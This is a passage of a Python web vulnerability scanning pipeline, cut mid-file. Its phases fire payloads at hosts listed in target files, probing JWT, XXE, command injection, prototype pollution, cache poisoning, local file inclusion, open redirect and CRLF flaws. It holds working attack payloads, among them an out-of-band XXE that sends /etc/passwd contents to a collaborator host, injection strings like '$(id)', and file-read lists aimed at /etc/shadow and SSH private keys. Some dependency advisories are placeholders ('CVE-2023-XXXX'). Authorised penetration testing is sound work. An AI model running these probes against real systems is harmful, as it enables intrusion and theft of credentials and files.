    log("ok", f"23-RACE: {len(findings)} race condition probes → {out}")
    return {"23-RACE": str(out), "count": len(findings)}


# ────────────────── Phase 24-JWT: JWT Attack Surface ───────────────────────────
_JWT_NONE_PAYLOADS = [
    "eyJhbGciOiJub25lIn0",
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0",
]
_JWT_WEAK_KEYS = ["secret", "password", "12345", "key", "admin", "changeme", "secretkey", "jwt_secret"]


async def phase_24_JWT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"24-JWT"}:
        return {}
    _out = outdir / "jwt_analysis.txt"
    if _out.exists() and not force:
        return {"24-JWT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 24-JWT: JWT token analysis")
    findings: List[str] = []
    _j_urlopen = _get_urlopener()
    _jwt_extra_headers = _extra_headers_dict()
    # Collect HTTP targets and probe for JWTs
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h
               for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_jwt]
    if not targets:
        log("warn", "24-JWT: no HTTP targets; skipping")
        return {"24-JWT": str(_out), "count": 0}
    # Probe for JWTs in Authorization headers, cookies, and response bodies
    async def _probe_jwt(url: str) -> List[str]:
        results: List[str] = []
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_jwt_extra_headers})
            _, headers, body_bytes = await _async_urlopen(_j_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            all_text = body + " " + " ".join(f"{k}:{v}" for k, v in headers.items())
            for m in re.finditer(r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", all_text):
                token = m.group()
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    header_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
                    payload_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
                    header = json.loads(base64.urlsafe_b64decode(header_b64))
                    payload = json.loads(base64.urlsafe_b64decode(payload_b64))
                    alg = header.get("alg", "unknown")
                    results.append(f"[jwt-found] {url} alg={alg} payload={json.dumps(payload, default=str)[:200]}")
                    if alg == "none":
                        results.append(f"[jwt-critical] alg=none detected on {url}")
                    if "kid" in header:
                        kid_val = header["kid"]
                        results.append(f"[jwt-kid] kid={kid_val} on {url} — possible KID injection")
                        if "/" in kid_val or ".." in kid_val:
                            results.append(f"[jwt-kid-path-traversal] kid={kid_val} contains path traversal chars")
                    if "jku" in header:
                        jku_val = header["jku"]
                        results.append(f"[jwt-jku] jku={jku_val} on {url} — check for JKU SSRF")
                        if "evil" in jku_val.lower() or not jku_val.startswith("https"):
                            results.append(f"[jwt-jku-suspicious] jku URL may be attacker-controllable: {jku_val}")
                    if "jwk" in header:
                        results.append(f"[jwt-jwk-embedded] jwk present in header on {url} — embedded JWK may be attacker-controlled")
                    if "typ" in header and header["typ"] == "JWT":
                        pass
                    if alg and alg != "none" and alg != "RS256":
                        results.append(f"[jwt-unusual-alg] alg={alg} on {url}")
                    for weak_key in _JWT_WEAK_KEYS:
                        try:
                            import hmac as _hmac
                            sig_b64 = parts[2] + "=" * ((4 - len(parts[2]) % 4) % 4)
                            sig = base64.urlsafe_b64decode(sig_b64)
                            expected = _hmac.new(weak_key.encode(), (parts[0] + "." + parts[1]).encode(), "sha256").digest()
                            if _hmac.compare_digest(sig, expected):
                                results.append(f"[jwt-weak-hmac] token signed with weak key '{weak_key}' on {url}")
                                break
                        except Exception:
                            continue
                    if alg == "RS256":
                        try:
                            import hmac as _hmac
                            hmac_sig = _hmac.new(b"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC", (parts[0] + "." + parts[1]).encode(), "sha256").digest()
                            results.append(f"[jwt-alg-confusion-test] try RS256→HS256 with public key as HMAC secret on {url}")
                        except Exception:
                            pass
                except Exception:
                    continue
        except Exception:
            pass
        return results
    jwt_results = await asyncio.gather(*[_probe_jwt(t) for t in targets])
    for jr in jwt_results:
        findings.extend(jr)
    if not findings:
        findings.append("[jwt] No JWT tokens found in initial probes")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"24-JWT: {len(findings)} JWT analysis findings → {out}")
    return {"24-JWT": str(out), "count": len(findings)}


# ────────────────── Phase 25-XXE: XML External Entity Injection ────────────────
async def phase_25_XXE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], oast_domain: Optional[str], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"25-XXE"}:
        return {}
    _out = outdir / "xxe.txt"
    if _out.exists() and not force:
        return {"25-XXE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 25-XXE: XML external entity injection probes")
    findings: List[str] = []
    _x_urlopen = _get_urlopener()
    _xxe_extra_headers = _extra_headers_dict()
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "25-XXE: no URLs; skipping")
        return {"25-XXE": str(_out), "count": 0}
    targets = [u.split("?")[0] for u in all_urls][:_PIPELINE_CFG.sample_urls_xxe]
    oast_ref = oast_domain or "burpcollaborator.net"
    _xxe_p1 = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'''
    _xxe_p2 = '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>'''
    _xxe_p3 = f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM "http://{oast_ref}/xxe-oob"> %test;]><root/>'''
    _xxe_p4 = f'''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oast_ref}/xxe?data=%file;'>">%eval;%exfil;]><root/>'''
    xxe_payloads = [_xxe_p1, _xxe_p2, _xxe_p3, _xxe_p4]
    async def _probe_xxe(url: str) -> List[str]:
        results: List[str] = []
        for i, payload in enumerate(xxe_payloads):
            try:
                req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST",
                    headers={"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0", **_xxe_extra_headers})
                xs, _, xb = await _async_urlopen(_x_urlopen, req, timeout=10)
                body = xb.decode("utf-8", errors="ignore")
                if "root" in body and ("root" in body[:100] or xs in (200, 201)):
                    results.append(f"[xxe-candidate] {url} payload={i} HTTP {xs}")
                    break
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode("utf-8", errors="ignore")
                    if "root" in body or "file" in body.lower():
                        results.append(f"[xxe-error-reflected] {url} payload={i} HTTP {e.code}")
                        break
                except Exception:
                    continue
            except Exception:
                continue
        return results
    xxe_results = await asyncio.gather(*[_probe_xxe(t) for t in targets])
    for xr in xxe_results:
        findings.extend(xr)
    if not findings:
        findings.append("[xxe] No XXE candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"25-XXE: {len(findings)} XXE probe findings → {out}")
    return {"25-XXE": str(out), "count": len(findings)}


# ────────────────── Phase 26-CMDINJECT: Command Injection ──────────────────────
_CMDI_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; uname -a",
    "| whoami",
    "; ping -c 1 127.0.0.1",
    "| nslookup example.com",
    "& echo ${PATH}",
]
_CMDI_PARAMS = {"host", "ping", "domain", "server", "ip", "target", "url", "path", "cmd", "command", "exec", "shell", "dir", "folder", "file"}


async def phase_26_CMDINJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"26-CMDINJECT"}:
        return {}
    _out = outdir / "cmd_injection.txt"
    if _out.exists() and not force:
        return {"26-CMDINJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 26-CMDINJECT: OS command injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "26-CMDINJECT: no URLs; skipping")
        return {"26-CMDINJECT": str(_out), "count": 0}
    findings: List[str] = []
    _c_urlopen = _get_urlopener()
    _cmdi_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_cmdi]
    if t.has("commix") and param_urls:
        commix_outdir = outdir / "logs" / "commix"
        commix_outdir.mkdir(parents=True, exist_ok=True)
        for u in param_urls:
            runner = outdir / "logs" / f"commix_{_safe_name(u)}_runner.sh"
            ensure(runner)
            runner.write_text(
                "#!/usr/bin/env bash\n"
                "set -eu\n"
                f"URL={shlex.quote(u)}\n"
                f"OUT={shlex.quote(str(commix_outdir))}\n"
                'commix -u "$URL" --batch --output-dir="$OUT" 2>/dev/null || true\n'
            )
            runner.chmod(0o755)
            await _run(
                f"commix-{_safe_name(u)}",
                ["bash", str(runner)],
                600, outdir,
            )
        commix_reports = list(commix_outdir.glob("**/*.txt"))
        if commix_reports:
            findings.append(f"[commix] {len(commix_reports)} report files → {commix_outdir}")
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in _CMDI_PARAMS:
                continue
            for payload in _CMDI_PAYLOADS:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    await _throttle_rate()
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_cmdi_extra_headers})
                    _, _, body_bytes = await _async_urlopen(_c_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    indicators = ["uid=", "gid=", "groups=", "linux", "darwin", "www-data", "root:", "bin/",
                                  "microsoft", "windows", "nt authority", "command not found", "not recognized"]
                    if any(ind in body.lower() for ind in indicators):
                        findings.append(f"[cmdi-candidate] {test_url} param={param_name} payload={payload}")
                        break
                except Exception:
                    continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"26-CMDINJECT: {len(findings)} command injection probes → {out}")
    return {"26-CMDINJECT": str(out), "count": len(findings)}


# ────────────────── Phase 27-SSPP: Server-Side Prototype Pollution ─────────────
async def phase_27_SSPP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"27-SSPP"}:
        return {}
    _out = outdir / "sspp.txt"
    if _out.exists() and not force:
        return {"27-SSPP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 27-SSPP: server-side prototype pollution probes")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "27-SSPP: no URLs; skipping")
        return {"27-SSPP": str(_out), "count": 0}
    findings: List[str] = []
    _s_urlopen = _get_urlopener()
    _sspp_extra_headers = _extra_headers_dict()
    api_targets = [u.split("?")[0] for u in all_urls if "/api/" in u.lower()][:_PIPELINE_CFG.sample_endpoints_sspp]
    sspp_payloads = [
        {"__proto__": {"admin": True}},
        {"__proto__": {"is_admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"status": "active"}},
    ]
    for u in api_targets:
        for payload in sspp_payloads:
            try:
                body_data = json.dumps(payload).encode()
                req = urllib.request.Request(u, data=body_data, method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", **_sspp_extra_headers})
                ss, _, sb = await _async_urlopen(_s_urlopen, req, timeout=10)
                if ss in (200, 201, 302):
                    findings.append(f"[sspp-candidate] POST {u} payload={json.dumps(payload)} → HTTP {ss}")
            except urllib.error.HTTPError as e:
                if 500 <= e.code < 600:
                    findings.append(f"[sspp-crash-candidate] POST {u} payload={json.dumps(payload)} → HTTP {e.code}")
            except Exception:
                continue
    if not findings:
        findings.append("[sspp] No prototype pollution candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"27-SSPP: {len(findings)} prototype pollution probes → {out}")
    return {"27-SSPP": str(out), "count": len(findings)}


# ────────────────── Phase 28-CACHED: Web Cache Poisoning ───────────────────────
_CACHE_POISON_HEADERS = ["X-Forwarded-Host", "X-Host", "X-Forwarded-Scheme", "X-Original-URL", "X-Rewrite-URL"]
_CACHE_KEY_DISCLOSURE_HEADERS = ["Pragma: x-get-cache-key", "X-Cache-Key", "X-Cache-Path", "X-Cache-Params"]


async def phase_28_CACHED(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"28-CACHED"}:
        return {}
    _out = outdir / "cache_poison.txt"
    if _out.exists() and not force:
        return {"28-CACHED": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 28-CACHED: web cache poisoning/deception probes")
    findings: List[str] = []
    cp_urlopen = _get_urlopener()
    _cp_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h
               for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_cached]
    if not targets:
        log("warn", "28-CACHED: no HTTP targets; skipping")
        return {"28-CACHED": str(_out), "count": 0}
    async def _probe_cached(url: str) -> List[str]:
        results: List[str] = []
        try:
            base_req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cp_extra_headers})
            base_status, base_headers, _ = await _async_urlopen(cp_urlopen, base_req, timeout=10)
            base_cached = "x-cache" in str(base_headers).lower() or "age:" in str(base_headers).lower() or "cf-cache" in str(base_headers).lower()
            if not base_cached:
                return results
            results.append(f"[cache-detected] {url} — caching headers present")
            for hdr in _CACHE_POISON_HEADERS:
                try:
                    poison_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", hdr: "evil.example.com", **_cp_extra_headers})
                    p_status, p_headers, p_body = await _async_urlopen(cp_urlopen, poison_req, timeout=10)
                    p_str = str(p_headers).lower()
                    if "evil.example.com" in p_str:
                        results.append(f"[cache-poison-candidate] {url} via {hdr}: evil.example.com reflected in headers")
                        break
                except Exception:
                    continue
            for dhdr in _CACHE_KEY_DISCLOSURE_HEADERS:
                try:
                    d_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", dhdr: "1", **_cp_extra_headers})
                    _, d_headers, d_body = await _async_urlopen(cp_urlopen, d_req, timeout=10)
                    d_str = str(d_headers).lower() + d_body.decode("utf-8", errors="ignore").lower()
                    if "cache-key" in d_str or d_body and len(d_body) > 10:
                        results.append(f"[cache-key-disclosure] {url} via {dhdr}")
                except Exception:
                    continue
            try:
                xou_req = urllib.request.Request(url + "/nonexistent-cache-test", method="GET",
                    headers={"User-Agent": "Mozilla/5.0", "X-Original-URL": "/admin", **_cp_extra_headers})
                _, xou_headers, _ = await _async_urlopen(cp_urlopen, xou_req, timeout=10)
                if "x-cache" in str(xou_headers).lower() or "age:" in str(xou_headers).lower():
                    results.append(f"[cache-deception-candidate] {url} via X-Original-URL: /admin")
            except Exception:
                pass
        except Exception:
            pass
        return results
    cp_results = await asyncio.gather(*[_probe_cached(t) for t in targets])
    for cr in cp_results:
        findings.extend(cr)
    if not findings:
        findings.append("[cached] No cache poisoning candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"28-CACHED: {len(findings)} cache probes → {out}")
    return {"28-CACHED": str(out), "count": len(findings)}


# ────────────────── Phase 29-DEPCHECK: JS Dependency Vuln Check ────────────────
_DEP_CHECK_PATTERNS: List[Tuple[str, str, str, str]] = [
    ("jquery", r"jquery[.-]?([\d.]+)", "3.5.0", "CVE-2020-11023+ (XSS via HTML parsing)"),
    ("angular", r"angular[.-]?([\d.]+)", "1.8.0", "CVE-2022-25869 (XSS)"),
    ("react", r"react[.-]?([\d.]+)", "16.14.0", "CVE-2023-XXXX (various)"),
    ("lodash", r"lodash[.-]?([\d.]+)", "4.17.21", "CVE-2021-23337 (prototype pollution)"),
    ("vue", r"vue[.-]?([\d.]+)", "2.7.0", "CVE-2023-XXXX (XSS)"),
    ("moment", r"moment[.-]?([\d.]+)", "2.29.4", "CVE-2022-24785 (ReDoS)"),
    ("bootstrap", r"bootstrap[.-]?([\d.]+)", "4.6.2", "CVE-2020-11023 (XSS)"),
    ("express", r"express[.-]?([\d.]+)", "4.18.2", "CVE-2022-24999 (qs prototype pollution)"),
]


def _parse_semver(ver: str) -> Optional[Tuple[int, int, int]]:
    parts = ver.split(".")
    if len(parts) >= 3 and all(p.isdigit() for p in parts[:3]):
        return (int(parts[0]), int(parts[1]), int(parts[2]))
    if len(parts) >= 2 and all(p.isdigit() for p in parts[:2]):
        return (int(parts[0]), int(parts[1]), 0)
    return None


def _semver_lt(v1: Tuple[int, int, int], v2: Tuple[int, int, int]) -> bool:
    return v1 < v2


async def phase_29_DEPCHECK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"29-DEPCHECK"}:
        return {}
    _out = outdir / "depcheck.txt"
    if _out.exists() and not force:
        return {"29-DEPCHECK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 29-DEPCHECK: JS dependency vulnerability scanning")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _dc_extra_headers = _extra_headers_dict()
    js_urls = outdir / "urls_js.txt"
    all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        await asyncio.sleep(3)
        all_js = read_lines(js_urls) if js_urls.exists() else []
    if not all_js:
        log("warn", "29-DEPCHECK: no JS URLs; skipping")
        return {"29-DEPCHECK": str(_out), "count": 0}
    scanned = 0
    seen_deps: Set[str] = set()
    for js_url in all_js[:_PIPELINE_CFG.sample_urls_depcheck]:
        try:
            req = urllib.request.Request(js_url, headers={"User-Agent": "Mozilla/5.0", **_dc_extra_headers})
            _, _, body_bytes = await _async_urlopen(_d_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
            scanned += 1
            for dep_name, pattern, safe_ver_str, advisory in _DEP_CHECK_PATTERNS:
                for m in re.finditer(pattern, body, re.IGNORECASE):
                    ver = m.group(1)
                    cache_key = f"{dep_name}@{ver}"
                    if cache_key in seen_deps:
                        continue
                    seen_deps.add(cache_key)
                    parsed = _parse_semver(ver)
                    safe_ver = _parse_semver(safe_ver_str)
                    if parsed and safe_ver and _semver_lt(parsed, safe_ver):
                        findings.append(f"[outdated] {dep_name} v{ver} in {js_url} — {advisory}")
                    else:
                        findings.append(f"[dep] {dep_name} v{ver} in {js_url} (current)")
        except Exception:
            continue
    findings.append(f"[depcheck] scanned {scanned} JS files, {len(seen_deps)} unique dependencies found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"29-DEPCHECK: {len(findings)} dependency findings → {out}")
    return {"29-DEPCHECK": str(out), "count": len(findings)}


async def phase_30_LFI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"30-LFI"}:
        return {}
    _out = outdir / "lfi.txt"
    if _out.exists() and not force:
        return {"30-LFI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 30-LFI: path traversal / local file inclusion probes")
    findings: List[str] = []
    _lfi_urlopen = _get_urlopener()
    _lfi_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    if not all_urls:
        log("warn", "30-LFI: no URLs; skipping")
        return {"30-LFI": str(_out), "count": 0}
    # Identify file-read parameters
    file_params = ["file", "page", "template", "include", "path", "doc", "document",
                   "folder", "root", "load", "read", "dir", "show", "view",
                   "content", "editor", "preview", "resource", "config",
                   "language", "lang", "style", "template", "plugin"]
    param_urls = [
        u for u in all_urls
        if "=" in u and any(f"{p}=" in u.lower() for p in file_params)
    ]
    if not param_urls:
        param_urls = [u for u in all_urls if "=" in u]
    param_urls = param_urls[:_PIPELINE_CFG.sample_urls_lfi]
    if not param_urls:
        log("warn", "30-LFI: no parameter-bearing URLs; skipping")
        return {"30-LFI": str(_out), "count": 0}
    findings.append(f"target_urls={len(param_urls)}")
    lfi_payloads = [
        "/etc/passwd",
        "/etc/passwd%00",
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../windows/win.ini",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "/var/log/apache/access.log",
        "/var/log/apache2/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access.log",
        "/etc/issue",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/etc/ssh/sshd_config",
        "/root/.bash_history",
        "/home/ubuntu/.bash_history",
        "/home/admin/.ssh/id_rsa",
        "/home/ubuntu/.ssh/authorized_keys",
        "/var/www/html/config.php",
        "/var/www/config.php",
        "/var/www/application/config/database.php",
        "/web.config",
        "/WEB-INF/web.xml",
        "/WEB-INF/db.properties",
    ]
    lfi_indicators = [
        "root:", "root:x:", "daemon:", "bin:", "sys:", "nobody:",
        "[extensions]", "[fonts]", "load average", "uptime",
        "www-data", "wwwrun", "localhost", "nameserver",
        "ssh-rsa", "ssh-dss", "BEGIN RSA PRIVATE KEY",
        "MIIE", "mysql:", "postgres:", "admin:",
        "windowssystem32", "[drivers]", "running kernel",
        "<configuration>", "<web-app", "<?xml ",
    ]
    async def _probe_lfi(url: str) -> List[str]:
        results: List[str] = []
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return results
        base_len = None
        try:
            base_req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers})
            _, _, base_body = await _async_urlopen(_lfi_urlopen, base_req, timeout=10)
            base_len = len(base_body)
        except Exception:
            pass
        for pname in qs:
            if not any(fp in pname.lower() for fp in file_params):
                continue
            for payload in lfi_payloads[:_PIPELINE_CFG.sample_endpoints_post]:
                await _throttle_rate()
                encoded_payload = urllib.parse.quote(payload, safe='')
                query_parts = []
                for k, vals in qs.items():
                    for v in vals:
                        if k == pname:
                            query_parts.append(f"{urllib.parse.quote_plus(k)}={encoded_payload}")
                        else:
                            query_parts.append(f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}")
                new_qs = '&'.join(query_parts)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers})
                    lfi_status, _, lfi_body = await _async_urlopen(_lfi_urlopen, req, timeout=10)
                    body_text = lfi_body.decode("utf-8", errors="ignore")
                    if any(ind in body_text for ind in lfi_indicators):
                        results.append(f"[lfi-confirmed] {test_url} → param={pname} payload={payload}")
                        # Show first 3 lines of response as evidence
                        for sample_line in body_text.splitlines()[:3]:
                            if sample_line.strip():
                                results.append(f"  {sample_line[:200]}")
                    elif lfi_status == 200 and base_len is not None and abs(len(lfi_body) - base_len) > max(300, base_len * 0.2):
                        results.append(f"[lfi-candidate] {test_url} → param={pname} payload={payload} len={len(lfi_body)}")
                except Exception:
                    continue
        return results
    probe_results = await asyncio.gather(*[_probe_lfi(u) for u in param_urls])
    for pr in probe_results:
        findings.extend(pr)
    if not findings:
        findings.append("[result] No LFI vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"30-LFI: {len(findings)} findings → {out}")
    return {"30-LFI": str(_out), "count": len(findings)}


# ────────────────── Phase 31-OPENREDIR: Open Redirect Detection ────────────────
_OPENREDIR_PAYLOADS = [
    ("url", "https://evil.com"),
    ("next", "https://evil.com"),
    ("redirect", "https://evil.com"),
    ("redirect_uri", "https://evil.com"),
    ("return", "https://evil.com"),
    ("return_to", "https://evil.com"),
    ("return_url", "https://evil.com"),
    ("target", "https://evil.com"),
    ("dest", "https://evil.com"),
    ("destination", "https://evil.com"),
    ("redir", "https://evil.com"),
    ("redirect_url", "https://evil.com"),
    ("rurl", "https://evil.com"),
    ("link", "https://evil.com"),
    ("goto", "https://evil.com"),
    ("out", "https://evil.com"),
    ("view", "https://evil.com"),
    ("file", "https://evil.com"),
    ("load", "https://evil.com"),
    ("path", "//evil.com"),
    ("url", "//evil.com"),
    ("next", "//evil.com"),
]


async def phase_31_OPENREDIR(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"31-OPENREDIR"}:
        return {}
    _out = outdir / "open_redirect.txt"
    if _out.exists() and not force:
        return {"31-OPENREDIR": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 31-OPENREDIR: open redirect detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "31-OPENREDIR: no URLs; skipping")
        return {"31-OPENREDIR": str(_out), "count": 0}
    findings: List[str] = []
    _or_urlopen = _get_urlopener()
    _or_extra_headers = _extra_headers_dict()
    param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_redirect]
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            for target_param, redirect_val in _OPENREDIR_PAYLOADS:
                if param_name.lower() == target_param:
                    test_qs = qs.copy()
                    test_qs[param_name] = [redirect_val]
                    new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    try:
                        req = urllib.request.Request(test_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_or_extra_headers})
                        resp_status, resp_headers, _ = await _async_urlopen_no_redirect(_or_urlopen, req, timeout=10)
                        location = resp_headers.get("Location", "")
                        if not location:
                            location = resp_headers.get("location", "")
                        if "evil.com" in location or "//evil.com" in location:
                            findings.append(f"[open-redirect] {test_url} -> {location} (HTTP {resp_status})")
                    except urllib.error.HTTPError as e:
                        location = e.headers.get("Location", "") or e.headers.get("location", "")
                        if "evil.com" in location or "//evil.com" in location:
                            findings.append(f"[open-redirect] {test_url} -> {location} (HTTP {e.code})")
                    except Exception:
                        continue
    if not findings:
        findings.append("[open-redirect] No open redirect candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"31-OPENREDIR: {len(findings)} open redirect probes -> {out}")
    return {"31-OPENREDIR": str(out), "count": len(findings)}


# ────────────────── Phase 32-CLICKJACK: Clickjacking Detection ─────────────────
_CLICKJACK_HEADERS_TO_CHECK = ["X-Frame-Options", "Content-Security-Policy"]


async def phase_32_CLICKJACK(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"32-CLICKJACK"}:
        return {}
    _out = outdir / "clickjacking.txt"
    if _out.exists() and not force:
        return {"32-CLICKJACK": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 32-CLICKJACK: clickjacking protection detection")
    findings: List[str] = []
    _cj_urlopen = _get_urlopener()
    _cj_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{h}" if not h.startswith("http") else h
               for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_clickjack]
    if not targets:
        log("warn", "32-CLICKJACK: no HTTP targets; skipping")
        return {"32-CLICKJACK": str(_out), "count": 0}
    for url in targets:
        try:
            req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_cj_extra_headers})
            _, resp_headers, _ = await _async_urlopen(_cj_urlopen, req, timeout=10)
            xfo = resp_headers.get("X-Frame-Options", "")
            csp = resp_headers.get("Content-Security-Policy", "")
            has_xfo = bool(xfo)
            has_frame_ancestors = "frame-ancestors" in csp
            if not has_xfo and not has_frame_ancestors:
                findings.append(f"[clickjacking-missing] {url} — no X-Frame-Options or CSP frame-ancestors")
            elif not has_xfo:
                findings.append(f"[clickjacking-csp-only] {url} — CSP frame-ancestors present but no X-Frame-Options")
        except Exception:
            continue
    if not findings:
        findings.append("[clickjacking] All targets have clickjacking protection (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"32-CLICKJACK: {len(findings)} clickjacking checks -> {out}")
    return {"32-CLICKJACK": str(out), "count": len(findings)}


# ────────────────── Phase 33-CRLF: CRLF Injection Detection ────────────────────
_CRLF_PAYLOADS = [
    ("\r\nX-Injected: yes", "X-Injected"),
    ("\r\nX-Injected: yes\r\n", "X-Injected"),
    ("\nX-Injected: yes", "X-Injected"),
    ("\r\n\r\n<html>injected</html>", "injected"),
    ("\r\nSet-Cookie: crlf=injected", "crlf=injected"),
]


async def phase_33_CRLF(
